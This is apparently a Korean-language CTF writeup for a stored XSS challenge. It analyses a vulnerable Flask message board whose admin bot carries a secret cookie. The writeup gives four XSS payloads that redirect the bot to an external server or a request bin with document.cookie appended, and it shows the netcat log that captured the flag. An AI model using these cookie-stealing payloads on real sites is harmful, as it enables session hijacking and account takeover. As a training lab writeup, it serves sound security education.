---
title: "[Writeup] Knockon Bootcamp - 4. Xross Site Scripting"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Cross Site Scripting
  - Stored XSS
last_modified_at: 2024-09-01T00:10:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10006/>

![4. Xross Site Scripting 1](/assets/images/writeup/web-hacking/knock-on/4_XSS_1.png)

![4. Xross Site Scripting 2](/assets/images/writeup/web-hacking/knock-on/4_XSS_2.png)

![4. Xross Site Scripting 3](/assets/images/writeup/web-hacking/knock-on/4_XSS_3.png)

|

|

|

### 목표

---

게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기

|

### 공격 기법

---

Cross Site Scripting

- Stored XSS

|

|

|

## 문제 코드

```jsx
from flask import Flask, render_template, request, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy

import os
import requests

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
MYSQL_HOST = os.getenv("MYSQL_HOST")
SECRET_KEY = os.getenv("ADMIN_SECRET_KEY")
CHROMEDRIVER_PATH = os.getenv("CHROMEDRIVER_PATH")
localhost = "http://localhost:10006"

app.secret_key = SECRET_KEY
app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(100), nullable=False)
    content = db.Column(db.Text, nullable=False)

    def __repr__(self):
        return f"Post('{self.title}', '{self.content}')"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/board")
def board():
    posts = Post.query.all()
    message = request.args.get("message", None)
    return render_template("board.html", posts=posts, message=message)

@app.route("/add", methods=["GET", "POST"])
def add_post():
    if request.method == "POST":
        title = request.form["title"]
        content = request.form["content"]
        post = Post(title=title, content=content)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for("board"))
    return render_template("add_post.html")

@app.route("/post/<int:post_id>")
def view_post(post_id):
    post = Post.query.get_or_404(post_id)
    return render_template("post.html", post=post)

@app.route("/edit/<int:post_id>", methods=["GET", "POST"])
def edit_post(post_id):
    post = Post.query.get_or_404(post_id)
    if request.method == "POST":
        post.title = request.form["title"]
        post.content = request.form["content"]
        db.session.commit()
        return redirect(url_for("board"))
    return render_template("edit_post.html", post=post)

@app.route("/delete/<int:post_id>", methods=["GET"])
def delete_post(post_id):
    post = Post.query.get_or_404(post_id)
    db.session.delete(post)
    db.session.commit()
    return redirect(url_for("board"))

@app.route("/search", methods=["GET", "POST"])
def search():
    if request.method == "POST":
        search_term = request.form["search"]
        posts = Post.query.filter(
            Post.title.contains(search_term) | Post.content.contains(search_term)
        ).all()
        return render_template("search.html", posts=posts)
    return render_template("search.html")

def read_url(url, cookie={"name": "name", "value": "value"}):
    driver = None
    try:
        service = Service(executable_path=CHROMEDRIVER_PATH)

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=1920x1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=service, options=options)

        driver.implicitly_wait(3)
        driver.set_page_load_timeout(10)

        driver.get(localhost)
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    finally:
        if driver:
            driver.quit()
        return True

@app.route("/admin/<int:post_id>", methods=["GET", "POST"])
def admin(post_id):
    target_url = localhost + f"/post/{post_id}"

    if requests.get(target_url).status_code == 404:
        message = f"Unvalid Post ID"
        posts = Post.query.all()
        return render_template("board.html", posts=posts, message=message)

    cookie = {"name": "cookie", "value": SECRET_KEY}
    success = read_url(target_url, cookie)

    if success:
        message = f"Bot activated successfully and visited: {target_url}"
    else:
        message = f"Bot activation failed: {target_url}"

    posts = Post.query.all()
    return render_template("board.html", posts=posts, message=message)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10006, debug=True)
```

|

|

|

## 코드 분석

### real_url()

---

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    driver = None
    try:
        service = Service(executable_path=CHROMEDRIVER_PATH)

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=1920x1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=service, options=options)

        driver.implicitly_wait(3)
        driver.set_page_load_timeout(10)

        driver.get(localhost)
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    finally:
        if driver:
            driver.quit()
        return True
```

|

```jsx
def read_url(url, cookie={"name": "name", "value": "value"}):
```

`cookie` 기본값 설정. 호출 시 다른 값으로 변경 가능

|

```python
service = Service(executable_path=CHROMEDRIVER_PATH)

options = webdriver.ChromeOptions()
```

`Selenium WebDriver`가 크롬 브라우저를 제어하도록 하는 `service` 객체 생성

크롬 브라우저에 대한 옵션 설정을 위한 `options` 객체 생성

|

```python
options.add_argument("--headless")
options.add_argument("--window-size=1920x1080")
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
```

`--headless`: UI 없이 백그라운드에서 작동

`--window-size=1920x1080`: 브라우저 창 크기 설정

`--disable-gpu`: GPU 가속 비활성. `headless` 모드에서 주로 사용

`--no-sandbox`: 샌드박스 모드 비활성. 악의적인 코드에 대한 보안 검사를 수행하지 않게됨

`--disable-dev-shm-usage`: 공유 메모리(/dev/shm) 사용 비활성. 메모리 부족 방지

|

```python
driver = webdriver.Chrome(service=service, options=options)
```

설정된 `service`와 `options`로 `Chrome WebDriver` 초기화. 이 객체를 사용해 브라우저 제어

|

```python
driver.implicitly_wait(3) # 사전 설정
driver.set_page_load_timeout(10) # 사전 설정

driver.get(localhost) # 봇만 알고있는 localhost
driver.add_cookie(cookie)
driver.get(url) # 공격자의 게시물 url
```

`implicitly_wait(3)`: 특정 요소(버튼, 입력 필드 등)를 찾을 때까지 최대 3초 대기

`set_page_load_timeout(10)`: 전체 페이지 로드에 최대 10초 대기

`get([localhost](http://localhost))`: localhost 페이지가 로드됨. 

`add_cookie(cookie)`: 쿠키를 현재 세션에 추가

`get(url)`: 지정된 url 로드

|

|

### admin()

---

```python
def admin(post_id):
    target_url = localhost + f"/post/{post_id}"

    if requests.get(target_url).status_code == 404:
        message = f"Unvalid Post ID"
        posts = Post.query.all()
        return render_template("board.html", posts=posts, message=message)

    cookie = {"name": "cookie", "value": SECRET_KEY}
    success = read_url(target_url, cookie)

    if success:
        message = f"Bot activated successfully and visited: {target_url}"
    else:
        message = f"Bot activation failed: {target_url}"

    posts = Post.query.all()
    return render_template("board.html", posts=posts, message=message)
```

|

```python
target_url = localhost + f"/post/{post_id}"
```

`target_url` 설정. post_id가 1이라면, `“http://localhost:10006/post/1”`이 됨

|

```python
if requests.get(target_url).status_code == 404:
    message = f"Unvalid Post ID"
    posts = Post.query.all()
    return render_template("board.html", posts=posts, message=message)
```

`target_url`이 유효하지 않으면(게시물이 없으면) `Unvalid Post ID`출력

|

```python
cookie = {"name": "cookie", "value": SECRET_KEY}
```

`cookie`라는 이름을 가진 쿠키 객체 생성. 쿠키 이름과 값을 `cookie`, `SECRET_KEY`로 정의

|

```python
success = read_url(target_url, cookie)
```

`read_url()` 함수의 인자로 `target_url`과 `cookie` 설정

`real_url()`은 봇이 Selenium으로 target_url에 방문하게 함. `success` 변수는 성공  여부에 따라 `true`(방문 성공) 혹은 `false`(방문 실패)

|

```python
if success:
	message = f"Bot activated successfully and visited: {target_url}"
else:
	message = f"Bot activation failed: {target_url}"
```

`success` 성공 여부에 따라 메시지 출력

|

```python
posts = Post.query.all()
return render_template("board.html", posts=posts, message=message)
```

코드 실행 후에도 게시물을 보여주기 위해, 게시물 목록을 DB에서 가져와 `board.html`에 전달하여 게시물을 포함한 페이지 렌더링

|

|

|

## 문제 풀이

코드 분석 결과를 정리하면

1. 봇 실행 → admin()함수 실행
    1. `target_url = “http://localhost:10006/post/1”` → 변수 설정
    2. 쿠키 객체 생성 → `cookie = {“name”: ”cookie”, “value”: SECRET_KEY}`
    3. `real_url(target_url, cookie)` 함수 호출 및 인자 전달
    
2. read_url(url, cookie={"name": "name", "value": "value"}) 함수 실행
    1. `driver.get(localhost)` → localhost 페이지 로드
    2. `driver.add_cookie(cookie)` → locathost 페이지에서 쿠키 설정
    3. `driver.get(url)` → `target_url`실행
    4. `target_url`에서 악성 스크립트 실행 → **공격자의 웹 페이지로 쿠키 유출**

|

`driver.get(localhost)`로 localhost 페이지를 로드 하는 이유는, 쿠키의 설정 원리 때문임

**쿠키 설정 원리**: 쿠키는 특정 도메인에서 생성. 해당 도메인에서만 사용 가능(localhost에서 생성됐으면 localhost에서만 사용 가능)

`target_url`에서 실행될, 내 웹 페이지로 쿠키를 유출하는 악성 스크립트를 작성하면 됨(XSS)

|

|

## 문제 풀이 1: 내 웹 서버

### azure 설정

---

1. 네트워크 보안 그룹(NSG) - 인바운드 규칙 추가
2. 포트 설정(10010)
3. 프로토콜(TCP)

|

### VM 방화벽 설정

---

```
sudo ufw allow 10010/tcp
sudo ufw reload
```

|

### 코드 작성

---

```jsx
 // 코드 1
<script>location.href="http://20.41.120.97:10010/"+document.cookie</script>

 // 코드 2
<img src="asd" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>

 // 코드 3
<body onload="location.href='http://20.41.120.97:10010/'+document.cookie">

 // 코드 4
<script>setTimeout( () => {location.href="http://20.41.120.97:10010/"+document.cookie;}, 1000);</script>
```

**공통점:** 브라우저의 `location.href`속성을 사용해 지정된 URL(공격자의 웹사이트)로 리다이렉션, 그 과정에서 `document.cookie`로 쿠키 정보 수집

**코드 1**:  `<script>` 태그를 사용해 코드 직접 삽입. 즉시 실행

**코드2**: 이미지의 `src`속성에 잘못된 값을 넣어 로딩 오류 유도→`onerror`이벤트가 트리거되어 실행

**코드3**: `<body>`태그의 `onload` 이벤트 사용. 페이지가 로드되면 실행

**코드4**: `<script>` 태그 안에서 `setTimeout()`함수를 사용해 일정 시간 후 실행

|

### **실행 결과**

---

```bash
azureuser@php-dev-1:~$ nc -l -p 10010
GET /cookie=K0%7BWh3r3_d1d_my_s3cr3t_k3y?} HTTP/1.1
Host: 20.41.120.97:10010
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/126.0.6478.126 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:10006/
Accept-Encoding: gzip, deflate
```

|

|

## 문제 풀이 2: dreamhack **Request Bin**

![dreamhack tools](https://tools.dreamhack.games/main)

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/268eec14-34c4-4051-8dc4-d38320318ca4/image.png)

위 주소로 접속 후

1. 사이드바 Request Bin탭 클릭
2. 링크 생성
3. URL복사

|

```sql
<script>location.href="https://uplgtbm.request.dreamhack.games/"+document.cookie</script>
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/1a2f17c7-fca9-447e-a3b1-083285b95382/image.png)

복사한 `URL`을 `location.href`에 할당 후 `document.cookie`로 해당 URL에 쿠키 전송 코드 작성

|

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/d76d244c-6ef4-4d50-8f42-59a99d958687/image.png)

잘 게시됨

|

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/13182539-f592-4611-bff7-9d6ff861bfb0/image.png)

게시글을 클릭하면 바로 해당 주소로 이동됨

|

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/84ad5753-a5a9-4df8-a7fb-4cc93862eb3b/image.png)

Request Bin에서 요청을 확인할 수 있음

|

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/91161c19-ce0f-4314-9d55-5819b11047a3/image.png)

게시글 id 입력 후 Active Admin Bot 버튼을 누르면

|

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/478bf8cb-8014-4a19-bcb4-b195a90edfb8/image.png)

Request Bin에 cookie가 잘 전달됨

|

|

|

## Exploit

### 방법 1

---

```jsx
<script>location.href="http://20.41.120.97:10010/"+document.cookie</script>
```

```sql
<img src="asd" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>
```

```sql
<body onload="location.href='http://20.41.120.97:10010/'+document.cookie">
```

```python
<script>setTimeout( () => {location.href="http://20.41.120.97:10010/"+document.cookie;}, 1000);</script>
```

|

### 방법 2

---

```jsx
<script>location.href="https://uplgtbm.request.dreamhack.games/"+document.cookie</script>
```

|

|

### FLAG

---

```
K0{Wh3r3_d1d_my_s3cr3t_k3y?} 
```

|

---